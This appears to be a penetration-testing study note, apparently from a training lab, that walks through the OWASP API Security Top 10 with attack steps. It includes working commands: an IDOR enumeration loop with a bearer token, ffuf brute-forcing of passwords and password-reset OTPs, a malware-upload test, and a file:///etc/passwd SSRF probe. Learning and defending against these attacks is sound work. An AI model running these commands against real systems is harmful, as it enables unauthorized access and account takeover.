# API Attacks

[OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)

## Broken Object Level Authorization

- [API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- The API allows authenticated users to access data they are not authorized to view
- Authenticate as one user
- Find what is accessible for their role
- Change the parameter (IDOR)
- Automate the process:
```bash
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.59.242:35144/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NjEzNjk5MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.tM-yNdndwsWlMm4OzUgUE_tldLIa9ehL-usX5PDqyXCW3En3mCV0YjKWkYnEBsGyMe0JQphQxnlGgt6gHDzGig' | jq
done
```

## Broken Authentication

- [API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access
- Authenticate as one user
- Find what is accessible for their role
- Try changing password to "pass" and inspect error message to see if allows weak passwords
- If weak passwords are allowed can try fuzzing passwords for known users
- try an incorrect password to get error message
- fuzz passwords with ffuf
```bash
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.120.112:34036/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
- fuzz OTP for password reset
```bash
ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://94.237.120.112:34036/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "password"}' -fr "false" -t 100
```

## Broken Object Property Level Authorization

- [API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- The API reveals sensitive data to authorized users that they should not access or permits them to manipulate sensitive properties

### Exposure of Sensitive Information Due to Incompatible Policies

- Authenticate as one user
- Find what is accessible for their role
- Retrieve data to see if excessive data is given beyind what is required for the web app/site function

### Improperly Controlled Modification of Dynamically-Determined Object Attributes

- Authenticate as one user
- Find what is accessible for their role
- Test what aditional can be updated/patched beyond what is required for web app/site function

## Unrestricted Resource Consumption

- [API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- The API does not limit the amount of resources users can consume
- Authenticate as one user
- Find what is accessible for their role
- Create file with 30 random megabytes
```bash
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```
- Test if file uploads are unconstrained for size
- Test if file uploads or other requests (password reset for example) can be sent repeatedly causign DDOS
- Test if limited by file type, .exe rather than .pdf for example (allowing for reverse shell upload)
```bash
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
```
- Test if file upload location is public and if previously uploaded files can be downloaded (could store malware and send link to victim)
```bash
curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe
```

## Broken Function Level Authorization

- [API5:2023](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- The API allows unauthorized users to perform authorized operations
- Authenticate as one user
- Find what is accessible for their role
- Test to see if user can access endpoints they don't have authorisation for

## Unrestricted Access to Sensitive Business Flows

- [API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- The API exposes sensitive business flows, leading to potential financial losses and other damages
- Example: If we can see when items will be discounted we could by all those items at discount and resell at full price

## Server Side Request Forgery

- [API7:2023](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- The API does not validate requests adequately, allowing attackers to send malicious requests and interact with internal resources
- Upload a file
- See the uploaded file presented
- Test if abile to patch where the uploaded file is retrieved from
- Example ```file:///etc/passwd```
- Check the endpoint that retrieves the files contents

## Security Misconfiguration

- [API8:2023](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks
- Check user inputs for SQLi with a trailing ```'```
- Test insecure headers for CSRF vulnerabilities

## Improper Inventory Management

- [API9:2023](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- The API does not properly and securely manage version inventory
- Check to see if other versions of the API are available
- Enumerate other versions for vulnerabilities

## Unsafe Consumption of APIs

- [API10:2023](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- The API consumes another API unsafely, leading to potential security risks
- Vulnerabilities that can arrise from API-to-API communication:
  1. **Insecure Data Transmission:** APIs communicating over unencrypted channels expose sensitive data to interception, compromising confidentiality and integrity.
  2. **Inadequate Data Validation:** Failing to properly validate and sanitize data received from external APIs before processing or forwarding it to downstream components can lead to injection attacks, data corruption, or even remote code execution.
  3. **Weak Authentication:** Neglecting to implement robust authentication methods when communicating with other APIs can result in unauthorized access to sensitive data or critical functionality.
  4. **Insufficient Rate-Limiting:** An API can overwhelm another API by sending a continuous surge of requests, potentially leading to denial-of-service.
  5. **Inadequate Monitoring:** Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.
